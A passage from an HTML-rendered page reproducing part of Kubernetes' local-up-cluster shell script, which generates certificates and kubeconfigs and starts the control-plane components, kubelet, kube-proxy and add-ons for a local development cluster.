"$&#123;CERT_DIR&#125;" "server-ca" kube-apiserver kubernetes.default kubernetes.default.svc "localhost" $&#123;API_HOST_IP&#125; $&#123;API_HOST&#125; $&#123;FIRST_SERVICE_CLUSTER_IP&#125;</span><br><span class="line">    # Create client certs signed with client-ca, given id, given CN and a number of groups</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kubelet system:node:$&#123;HOSTNAME_OVERRIDE&#125; system:nodes</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kube-proxy system:kube-proxy system:nodes</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' controller system:kube-controller-manager</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' scheduler  system:kube-scheduler</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' admin system:admin system:masters</span><br><span class="line">    # Create matching certificates for kube-aggregator</span><br><span class="line">    kube::util::create_serving_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "server-ca" kube-aggregator api.kube-public.svc "localhost" $&#123;API_HOST_IP&#125;</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" request-header-ca auth-proxy system:auth-proxy</span><br><span class="line">    # TODO remove masters and add rolebinding</span><br><span class="line">    kube::util::create_client_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" 'client-ca' kube-aggregator system:kube-aggregator system:masters</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kube-aggregator</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">      cloud_config_arg="--cloud-provider=external"</span><br><span class="line">    fi</span><br><span class="line">    APISERVER_LOG=$&#123;LOG_DIR&#125;/kube-apiserver.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" apiserver $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-apiserver" $&#123;swagger_arg&#125; $&#123;audit_arg&#125; $&#123;authorizer_arg&#125; $&#123;priv_arg&#125; $&#123;runtime_config&#125; \</span><br><span class="line">      $&#123;cloud_config_arg&#125; \</span><br><span class="line">      $&#123;advertise_address&#125; \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      --cert-dir="$&#123;CERT_DIR&#125;" \</span><br><span class="line">      --client-ca-file="$&#123;CERT_DIR&#125;/client-ca.crt" \</span><br><span class="line">      --service-account-key-file="$&#123;SERVICE_ACCOUNT_KEY&#125;" \</span><br><span class="line">      --service-account-lookup="$&#123;SERVICE_ACCOUNT_LOOKUP&#125;" \</span><br><span class="line">      --enable-admission-plugins="$&#123;ENABLE_ADMISSION_PLUGINS&#125;" \</span><br><span class="line">      --disable-admission-plugins="$&#123;DISABLE_ADMISSION_PLUGINS&#125;" \</span><br><span class="line">      --admission-control-config-file="$&#123;ADMISSION_CONTROL_CONFIG_FILE&#125;" \</span><br><span class="line">      --bind-address="$&#123;API_BIND_ADDR&#125;" \</span><br><span class="line">      --secure-port="$&#123;API_SECURE_PORT&#125;" \</span><br><span class="line">      --tls-cert-file="$&#123;CERT_DIR&#125;/serving-kube-apiserver.crt" \</span><br><span class="line">      --tls-private-key-file="$&#123;CERT_DIR&#125;/serving-kube-apiserver.key" \</span><br><span class="line">      --insecure-bind-address="$&#123;API_HOST_IP&#125;" \</span><br><span class="line">      --insecure-port="$&#123;API_PORT&#125;" \</span><br><span class="line">      --storage-backend=$&#123;STORAGE_BACKEND&#125; \</span><br><span class="line">      --etcd-servers="http://$&#123;ETCD_HOST&#125;:$&#123;ETCD_PORT&#125;" \</span><br><span class="line">      --service-cluster-ip-range="$&#123;SERVICE_CLUSTER_IP_RANGE&#125;" \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --external-hostname="$&#123;EXTERNAL_HOSTNAME&#125;" \</span><br><span class="line">      --requestheader-username-headers=X-Remote-User \</span><br><span class="line">      --requestheader-group-headers=X-Remote-Group \</span><br><span class="line">      --requestheader-extra-headers-prefix=X-Remote-Extra- \</span><br><span class="line">      --requestheader-client-ca-file="$&#123;CERT_DIR&#125;/request-header-ca.crt" \</span><br><span class="line">      --requestheader-allowed-names=system:auth-proxy \</span><br><span class="line">      --proxy-client-cert-file="$&#123;CERT_DIR&#125;/client-auth-proxy.crt" \</span><br><span class="line">      --proxy-client-key-file="$&#123;CERT_DIR&#125;/client-auth-proxy.key" \</span><br><span class="line">      --cors-allowed-origins="$&#123;API_CORS_ALLOWED_ORIGINS&#125;" &gt;"$&#123;APISERVER_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    APISERVER_PID=$!</span><br><span class="line">    # Wait for kube-apiserver to come up before launching the rest of the components.</span><br><span class="line">    echo "Waiting for apiserver to come up"</span><br><span class="line">    # this uses the API port because if you don't have any authenticator, you can't seem to use the secure port at all.</span><br><span class="line">    # this matches what happened with the combination in 1.4.</span><br><span class="line">    # TODO change this conditionally based on whether API_PORT is on or off</span><br><span class="line">    kube::util::wait_for_url "https://$&#123;API_HOST_IP&#125;:$&#123;API_SECURE_PORT&#125;/healthz" "apiserver: " 1 $&#123;WAIT_FOR_URL_API_SERVER&#125; \</span><br><span class="line">        || &#123; echo "check apiserver logs: $&#123;APISERVER_LOG&#125;" ; exit 1 ; &#125;</span><br><span class="line">    # Create kubeconfigs for all components, using client certs</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" admin</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; chown "$&#123;USER&#125;" "$&#123;CERT_DIR&#125;/client-admin.key" # make readable for kubectl</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kubelet</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" kube-proxy</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" controller</span><br><span class="line">    kube::util::write_client_kubeconfig "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" "$&#123;ROOT_CA_FILE&#125;" "$&#123;API_HOST&#125;" "$&#123;API_SECURE_PORT&#125;" scheduler</span><br><span class="line">    if [[ -z "$&#123;AUTH_ARGS&#125;" ]]; then</span><br><span class="line">        AUTH_ARGS="--client-key=$&#123;CERT_DIR&#125;/client-admin.key --client-certificate=$&#123;CERT_DIR&#125;/client-admin.crt"</span><br><span class="line">    fi</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; cp "$&#123;CERT_DIR&#125;/admin.kubeconfig" "$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig"</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; chown $(whoami) "$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig"</span><br><span class="line">    $&#123;KUBECTL&#125; config set-cluster local-up-cluster --kubeconfig="$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig" --server="https://$&#123;API_HOST_IP&#125;:31090"</span><br><span class="line">    echo "use 'kubectl --kubeconfig=$&#123;CERT_DIR&#125;/admin-kube-aggregator.kubeconfig' to use the aggregated API server"</span><br><span class="line">&#125;</span><br><span class="line">function start_controller_manager &#123;</span><br><span class="line">    node_cidr_args=""</span><br><span class="line">    if [[ "$&#123;NET_PLUGIN&#125;" == "kubenet" ]]; then</span><br><span class="line">      node_cidr_args="--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 "</span><br><span class="line">    fi</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">      cloud_config_arg="--cloud-provider=external"</span><br><span class="line">      cloud_config_arg+=" --external-cloud-volume-plugin=$&#123;CLOUD_PROVIDER&#125;"</span><br><span class="line">      cloud_config_arg+=" --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    fi</span><br><span class="line">    CTLRMGR_LOG=$&#123;LOG_DIR&#125;/kube-controller-manager.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" controller-manager \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-controller-manager" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      --service-account-private-key-file="$&#123;SERVICE_ACCOUNT_KEY&#125;" \</span><br><span class="line">      --root-ca-file="$&#123;ROOT_CA_FILE&#125;" \</span><br><span class="line">      --cluster-signing-cert-file="$&#123;CLUSTER_SIGNING_CERT_FILE&#125;" \</span><br><span class="line">      --cluster-signing-key-file="$&#123;CLUSTER_SIGNING_KEY_FILE&#125;" \</span><br><span class="line">      --enable-hostpath-provisioner="$&#123;ENABLE_HOSTPATH_PROVISIONER&#125;" \</span><br><span class="line">      $&#123;node_cidr_args&#125; \</span><br><span class="line">      --pvclaimbinder-sync-period="$&#123;CLAIM_BINDER_SYNC_PERIOD&#125;" \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      $&#123;cloud_config_arg&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/controller.kubeconfig \</span><br><span class="line">      --use-service-account-credentials \</span><br><span class="line">      --controllers="$&#123;KUBE_CONTROLLERS&#125;" \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;CTLRMGR_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    CTLRMGR_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_cloud_controller_manager &#123;</span><br><span class="line">    if [ -z "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">      echo "CLOUD_CONFIG cannot be empty!"</span><br><span class="line">      exit 1</span><br><span class="line">    fi</span><br><span class="line">    if [ ! -f "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">      echo "Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist"</span><br><span class="line">      exit 1</span><br><span class="line">    fi</span><br><span class="line">    node_cidr_args=""</span><br><span class="line">    if [[ "$&#123;NET_PLUGIN&#125;" == "kubenet" ]]; then</span><br><span class="line">      node_cidr_args="--allocate-node-cidrs=true --cluster-cidr=10.1.0.0/16 "</span><br><span class="line">    fi</span><br><span class="line">    CLOUD_CTLRMGR_LOG=$&#123;LOG_DIR&#125;/cloud-controller-manager.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-"$&#123;GO_OUT&#125;/hyperkube" cloud-controller-manager&#125; \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; $&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-"$&#123;GO_OUT&#125;/cloud-controller-manager"&#125; \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">      $&#123;node_cidr_args&#125; \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --cloud-provider=$&#123;CLOUD_PROVIDER&#125; \</span><br><span class="line">      --cloud-config=$&#123;CLOUD_CONFIG&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/controller.kubeconfig \</span><br><span class="line">      --use-service-account-credentials \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;CLOUD_CTLRMGR_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    CLOUD_CTLRMGR_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_kubelet &#123;</span><br><span class="line">    KUBELET_LOG=$&#123;LOG_DIR&#125;/kubelet.log</span><br><span class="line">    mkdir -p "$&#123;POD_MANIFEST_PATH&#125;" &amp;&gt;/dev/null || sudo mkdir -p "$&#123;POD_MANIFEST_PATH&#125;"</span><br><span class="line">    priv_arg=""</span><br><span class="line">    if [[ -n "$&#123;ALLOW_PRIVILEGED&#125;" ]]; then</span><br><span class="line">      priv_arg="--allow-privileged "</span><br><span class="line">    fi</span><br><span class="line">    cloud_config_arg="--cloud-provider=$&#123;CLOUD_PROVIDER&#125; --cloud-config=$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">    if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">       cloud_config_arg="--cloud-provider=external"</span><br><span class="line">       cloud_config_arg+=" --provider-id=$(hostname)"</span><br><span class="line">    fi</span><br><span class="line">    mkdir -p "/var/lib/kubelet" &amp;&gt;/dev/null || sudo mkdir -p "/var/lib/kubelet"</span><br><span class="line">    if [[ -z "$&#123;DOCKERIZE_KUBELET&#125;" ]]; then</span><br><span class="line">      # Enable dns</span><br><span class="line">      if [[ "$&#123;ENABLE_CLUSTER_DNS&#125;" = true ]]; then</span><br><span class="line">         dns_args="--cluster-dns=$&#123;DNS_SERVER_IP&#125; --cluster-domain=$&#123;DNS_DOMAIN&#125;"</span><br><span class="line">      else</span><br><span class="line">         # To start a private DNS server set ENABLE_CLUSTER_DNS and</span><br><span class="line">         # DNS_SERVER_IP/DOMAIN. This will at least provide a working</span><br><span class="line">         # DNS server for real world hostnames.</span><br><span class="line">         dns_args="--cluster-dns=8.8.8.8"</span><br><span class="line">      fi</span><br><span class="line">      net_plugin_args=""</span><br><span class="line">      if [[ -n "$&#123;NET_PLUGIN&#125;" ]]; then</span><br><span class="line">        net_plugin_args="--network-plugin=$&#123;NET_PLUGIN&#125;"</span><br><span class="line">      fi</span><br><span class="line">      auth_args=""</span><br><span class="line">      if [[ -n "$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --authorization-mode=Webhook"</span><br><span class="line">      fi</span><br><span class="line">      if [[ -n "$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --authentication-token-webhook"</span><br><span class="line">      fi</span><br><span class="line">      if [[ -n "$&#123;CLIENT_CA_FILE:-&#125;" ]]; then</span><br><span class="line">        auth_args="$&#123;auth_args&#125; --client-ca-file=$&#123;CLIENT_CA_FILE&#125;"</span><br><span class="line">      fi</span><br><span class="line">      cni_conf_dir_args=""</span><br><span class="line">      if [[ -n "$&#123;CNI_CONF_DIR&#125;" ]]; then</span><br><span class="line">        cni_conf_dir_args="--cni-conf-dir=$&#123;CNI_CONF_DIR&#125;"</span><br><span class="line">      fi</span><br><span class="line">      cni_bin_dir_args=""</span><br><span class="line">      if [[ -n "$&#123;CNI_BIN_DIR&#125;" ]]; then</span><br><span class="line">        cni_bin_dir_args="--cni-bin-dir=$&#123;CNI_BIN_DIR&#125;"</span><br><span class="line">      fi</span><br><span class="line">      container_runtime_endpoint_args=""</span><br><span class="line">      if [[ -n "$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;" ]]; then</span><br><span class="line">        container_runtime_endpoint_args="--container-runtime-endpoint=$&#123;CONTAINER_RUNTIME_ENDPOINT&#125;"</span><br><span class="line">      fi</span><br><span class="line">      image_service_endpoint_args=""</span><br><span class="line">      if [[ -n "$&#123;IMAGE_SERVICE_ENDPOINT&#125;" ]]; then</span><br><span class="line">        image_service_endpoint_args="--image-service-endpoint=$&#123;IMAGE_SERVICE_ENDPOINT&#125;"</span><br><span class="line">      fi</span><br><span class="line">      #sudo -E "$&#123;GO_OUT&#125;/hyperkube" kubelet $&#123;priv_arg&#125;\</span><br><span class="line">      sudo -E "$&#123;GO_OUT&#125;/kubelet" $&#123;priv_arg&#125;\</span><br><span class="line">        --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">        --vmodule="$&#123;LOG_SPEC&#125;" \</span><br><span class="line">        --chaos-chance="$&#123;CHAOS_CHANCE&#125;" \</span><br><span class="line">        --container-runtime="$&#123;CONTAINER_RUNTIME&#125;" \</span><br><span class="line">--fail-swap-on=false \</span><br><span class="line">        #--rkt-path="$&#123;RKT_PATH&#125;" \</span><br><span class="line">        --rkt-stage1-image="$&#123;RKT_STAGE1_IMAGE&#125;" \</span><br><span class="line">        --hostname-override="$&#123;HOSTNAME_OVERRIDE&#125;" \</span><br><span class="line">        $&#123;cloud_config_arg&#125; \</span><br><span class="line">        --address="$&#123;KUBELET_HOST&#125;" \</span><br><span class="line">        --kubeconfig "$CERT_DIR"/kubelet.kubeconfig \</span><br><span class="line">        --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">        --cpu-cfs-quota=$&#123;CPU_CFS_QUOTA&#125; \</span><br><span class="line">        --enable-controller-attach-detach="$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;" \</span><br><span class="line">        --cgroups-per-qos=$&#123;CGROUPS_PER_QOS&#125; \</span><br><span class="line">        --cgroup-driver=$&#123;CGROUP_DRIVER&#125; \</span><br><span class="line">        --keep-terminated-pod-volumes=$&#123;KEEP_TERMINATED_POD_VOLUMES&#125; \</span><br><span class="line">        --eviction-hard=$&#123;EVICTION_HARD&#125; \</span><br><span class="line">        --eviction-soft=$&#123;EVICTION_SOFT&#125; \</span><br><span class="line">        --eviction-pressure-transition-period=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD&#125; \</span><br><span class="line">        --pod-manifest-path="$&#123;POD_MANIFEST_PATH&#125;" \</span><br><span class="line">        --fail-swap-on="$&#123;FAIL_SWAP_ON&#125;" \</span><br><span class="line">        $&#123;auth_args&#125; \</span><br><span class="line">        $&#123;dns_args&#125; \</span><br><span class="line">        $&#123;cni_conf_dir_args&#125; \</span><br><span class="line">        $&#123;cni_bin_dir_args&#125; \</span><br><span class="line">        $&#123;net_plugin_args&#125; \</span><br><span class="line">        $&#123;container_runtime_endpoint_args&#125; \</span><br><span class="line">        $&#123;image_service_endpoint_args&#125; \</span><br><span class="line">        --port="$KUBELET_PORT" \</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;KUBELET_FLAGS&#125; &gt;<span class="string">"<span class="variable">$&#123;KUBELET_LOG&#125;</span>"</span> 2&gt;&amp;1 &amp;</span></span><br><span class="line">      KUBELET_PID=$!</span><br><span class="line">      # Quick check that kubelet is running.</span><br><span class="line">      if ps -p $KUBELET_PID &gt; /dev/null ; then</span><br><span class="line">echo "kubelet ( $KUBELET_PID ) is running."</span><br><span class="line">      else</span><br><span class="line">cat $&#123;KUBELET_LOG&#125; ; exit 1</span><br><span class="line">      fi</span><br><span class="line">    else</span><br><span class="line">      # Docker won't run a container with a cidfile (container id file)</span><br><span class="line">      # unless that file does not already exist; clean up an existing</span><br><span class="line">      # dockerized kubelet that might be running.</span><br><span class="line">      cleanup_dockerized_kubelet</span><br><span class="line">      cred_bind=""</span><br><span class="line">      # path to cloud credentials.</span><br><span class="line">      cloud_cred=""</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "aws" ]; then</span><br><span class="line">          cloud_cred="$&#123;HOME&#125;/.aws/credentials"</span><br><span class="line">      fi</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "gce" ]; then</span><br><span class="line">          cloud_cred="$&#123;HOME&#125;/.config/gcloud"</span><br><span class="line">      fi</span><br><span class="line">      if [ "$&#123;CLOUD_PROVIDER&#125;" == "openstack" ]; then</span><br><span class="line">          cloud_cred="$&#123;CLOUD_CONFIG&#125;"</span><br><span class="line">      fi</span><br><span class="line">      if  [[ -n "$&#123;cloud_cred&#125;" ]]; then</span><br><span class="line">          cred_bind="--volume=$&#123;cloud_cred&#125;:$&#123;cloud_cred&#125;:ro"</span><br><span class="line">      fi</span><br><span class="line">      docker run \</span><br><span class="line">        --volume=/:/rootfs:ro \</span><br><span class="line">        --volume=/var/run:/var/run:rw \</span><br><span class="line">        --volume=/sys:/sys:ro \</span><br><span class="line">        --volume=/var/lib/docker/:/var/lib/docker:ro \</span><br><span class="line">        --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \</span><br><span class="line">        --volume=/dev:/dev \</span><br><span class="line">        --volume=/run/xtables.lock:/run/xtables.lock:rw \</span><br><span class="line">        $&#123;cred_bind&#125; \</span><br><span class="line">        --net=host \</span><br><span class="line">        --privileged=true \</span><br><span class="line">        -i \</span><br><span class="line">        --cidfile=$KUBELET_CIDFILE \</span><br><span class="line">        k8s.gcr.io/kubelet \</span><br><span class="line">        /kubelet --v=$&#123;LOG_LEVEL&#125; --containerized $&#123;priv_arg&#125;--chaos-chance="$&#123;CHAOS_CHANCE&#125;" --pod-manifest-path="$&#123;POD_MANIFEST_PATH&#125;" --hostname-override="$&#123;HOSTNAME_OVERRIDE&#125;" $&#123;cloud_config_arg&#125; \ --address="127.0.0.1" --kubeconfig "$CERT_DIR"/kubelet.kubeconfig --port="$KUBELET_PORT"  --enable-controller-attach-detach="$&#123;ENABLE_CONTROLLER_ATTACH_DETACH&#125;" &amp;&gt; $KUBELET_LOG &amp;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_kubeproxy &#123;</span><br><span class="line">    PROXY_LOG=$&#123;LOG_DIR&#125;/kube-proxy.log</span><br><span class="line">    cat &lt;&lt;EOF &gt; /tmp/kube-proxy.yaml</span><br><span class="line">apiVersion: kubeproxy.config.k8s.io/v1alpha1</span><br><span class="line">kind: KubeProxyConfiguration</span><br><span class="line">clientConnection:</span><br><span class="line">  kubeconfig: $&#123;CERT_DIR&#125;/kube-proxy.kubeconfig</span><br><span class="line">hostnameOverride: $&#123;HOSTNAME_OVERRIDE&#125;</span><br><span class="line">mode: $&#123;KUBE_PROXY_MODE&#125;</span><br><span class="line">EOF</span><br><span class="line">    #sudo "$&#123;GO_OUT&#125;/hyperkube" proxy \</span><br><span class="line">    sudo "$&#123;GO_OUT&#125;/kube-proxy" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --config=/tmp/kube-proxy.yaml \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;PROXY_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    PROXY_PID=$!</span><br><span class="line">    SCHEDULER_LOG=$&#123;LOG_DIR&#125;/kube-scheduler.log</span><br><span class="line">    #$&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/hyperkube" scheduler \</span><br><span class="line">    $&#123;CONTROLPLANE_SUDO&#125; "$&#123;GO_OUT&#125;/kube-scheduler" \</span><br><span class="line">      --v=$&#123;LOG_LEVEL&#125; \</span><br><span class="line">      --kubeconfig "$CERT_DIR"/scheduler.kubeconfig \</span><br><span class="line">      --feature-gates="$&#123;FEATURE_GATES&#125;" \</span><br><span class="line">      --master="https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125;" &gt;"$&#123;SCHEDULER_LOG&#125;" 2&gt;&amp;1 &amp;</span><br><span class="line">    SCHEDULER_PID=$!</span><br><span class="line">&#125;</span><br><span class="line">function start_kubedns &#123;</span><br><span class="line">    if [[ "$&#123;ENABLE_CLUSTER_DNS&#125;" = true ]]; then</span><br><span class="line">        cp "$&#123;KUBE_ROOT&#125;/cluster/addons/dns/kube-dns.yaml.in" kube-dns.yaml</span><br><span class="line">        sed -i -e "s/&#123;&#123; pillar\['dns_domain'\] &#125;&#125;/$&#123;DNS_DOMAIN&#125;/g" kube-dns.yaml</span><br><span class="line">        sed -i -e "s/&#123;&#123; pillar\['dns_server'\] &#125;&#125;/$&#123;DNS_SERVER_IP&#125;/g" kube-dns.yaml</span><br><span class="line">        # TODO update to dns role once we have one.</span><br><span class="line">        # use kubectl to create kubedns addon</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" --namespace=kube-system create -f kube-dns.yaml</span><br><span class="line">        echo "Kube-dns addon successfully deployed."</span><br><span class="line">        rm kube-dns.yaml</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_kubedashboard &#123;</span><br><span class="line">    if [[ "$&#123;ENABLE_CLUSTER_DASHBOARD&#125;" = true ]]; then</span><br><span class="line">        echo "Creating kubernetes-dashboard"</span><br><span class="line">        # use kubectl to create the dashboard</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-secret.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-configmap.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-rbac.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-controller.yaml</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" apply -f $&#123;KUBE_ROOT&#125;/cluster/addons/dashboard/dashboard-service.yaml</span><br><span class="line">        echo "kubernetes-dashboard deployment and service successfully deployed."</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function create_psp_policy &#123;</span><br><span class="line">    echo "Create podsecuritypolicy policies for RBAC."</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/policies.yaml</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/roles.yaml</span><br><span class="line">    $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $&#123;KUBE_ROOT&#125;/examples/podsecuritypolicy/rbac/bindings.yaml</span><br><span class="line">&#125;</span><br><span class="line">function create_storage_class &#123;</span><br><span class="line">    if [ -z "$CLOUD_PROVIDER" ]; then</span><br><span class="line">        CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/local/default.yaml</span><br><span class="line">    else</span><br><span class="line">        CLASS_FILE=$&#123;KUBE_ROOT&#125;/cluster/addons/storage-class/$&#123;CLOUD_PROVIDER&#125;/default.yaml</span><br><span class="line">    fi</span><br><span class="line">    if [ -e $CLASS_FILE ]; then</span><br><span class="line">        echo "Create default storage class for $CLOUD_PROVIDER"</span><br><span class="line">        $&#123;KUBECTL&#125; --kubeconfig="$&#123;CERT_DIR&#125;/admin.kubeconfig" create -f $CLASS_FILE</span><br><span class="line">    else</span><br><span class="line">        echo "No storage class available for $CLOUD_PROVIDER."</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function print_success &#123;</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">    echo "Local Kubernetes cluster is running. Press Ctrl-C to shut it down."</span><br><span class="line">  else</span><br><span class="line">    echo "Local Kubernetes cluster is running."</span><br><span class="line">  fi</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">Logs:</span><br><span class="line"><span 